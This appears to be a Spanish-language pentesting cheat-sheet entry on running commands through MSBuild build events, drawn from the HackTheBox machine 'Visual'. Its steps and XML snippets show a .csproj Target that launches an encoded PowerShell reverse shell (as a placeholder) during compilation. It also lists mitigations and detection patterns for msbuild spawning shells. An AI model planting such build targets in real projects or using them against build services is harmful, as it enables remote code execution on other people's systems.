---
topic: MSBuild — ejecución de comandos en eventos de compilación
tags: [windows, msbuild, dotnet, rce, visual, gitea]
---

# MSBuild — ejecución de comandos en eventos de compilación

[🌐 English](visual-studio-build-rce.en.md) | **Español**

## Concepto

Un proyecto de Visual Studio puede ejecutar comandos antes o después de compilar mediante `PreBuildEvent`, `PostBuildEvent` o un `Target` con `BeforeTargets`. Si un servicio compila proyectos aportados por usuarios, el proyecto es código ejecutable aunque no contenga código malicioso en el `.cs`.

En Visual, el sitio clonaba un repositorio Git y ejecutaba `msbuild` sobre el `.sln`; un `.csproj` con un target `PreBuild` daba una shell como `enox`.

## Cuándo aplica

- Servicio que compila repositorios o soluciones de usuarios.
- `msbuild`, `dotnet build` o Visual Studio con proyectos no confiables.
- El proceso de compilación corre con acceso a red, secretos o al webroot.
- En Visual, el servidor clonaba por HTTP y devolvía los binarios en `/uploads/<hash>/`.

## Procedimiento

1. Crear un proyecto .NET con un `.sln`.
2. Añadir un target o un evento al `.csproj`.
3. Publicarlo en un repositorio accesible por el servicio (Gitea propio).
4. Enviar la URL y esperar la compilación.
5. Recibir la shell o verificar el comando.

## Comandos

```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="powershell -e <BASE64_REVERSE_SHELL>" />
</Target>
```

```xml
<PropertyGroup>
  <PreBuildEvent>calc.exe</PreBuildEvent>
</PropertyGroup>
```

```bash
msbuild project.sln /p:Configuration=Release
dotnet build project.sln
```

## Variantes

- `PostBuildEvent` para ejecutar después de generar el binario.
- `BeforeBuild`, `AfterBuild` o un target con `DependsOnTargets`.
- Un `.props` o `.targets` importado por el proyecto.
- Una tarea `Exec` dentro de un target condicional.

## Limitaciones

- El servicio puede compilar en un contenedor sin red ni shell.
- `msbuild` puede estar restringido a proyectos firmados o a una allowlist.
- El repositorio debe ser accesible desde el servidor.
- PowerShell puede estar en modo restringido.

## Mitigación

- No compilar código de usuarios en el host; usar contenedores efímeros sin secretos.
- Revisar o bloquear `Exec`, `PreBuildEvent` y `PostBuildEvent`.
- Ejecutar la compilación con una cuenta de bajo privilegio y sin acceso al webroot.
- Firmar proyectos y validar el repositorio antes de compilar.
- Monitorizar `msbuild`, `csc` y procesos hijos inesperados.

## Detección

- `.csproj` con `Exec`, `PreBuildEvent` o `PostBuildEvent`.
- `msbuild` lanzando `powershell`, `cmd` o `curl`.
- Clonaciones Git desde el servidor de compilación hacia hosts externos.
- Binarios nuevos en `/uploads` y webshells en `htdocs`.

## Referencias

- [Microsoft — MSBuild targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [Microsoft — PreBuildEvent](https://learn.microsoft.com/en-us/visualstudio/msbuild/common-msbuild-project-properties)
- [0xdf — Visual](https://0xdf.gitlab.io/2024/02/24/htb-visual.html)
- [Ficha Visual](../../machines/windows/visual/README.md)
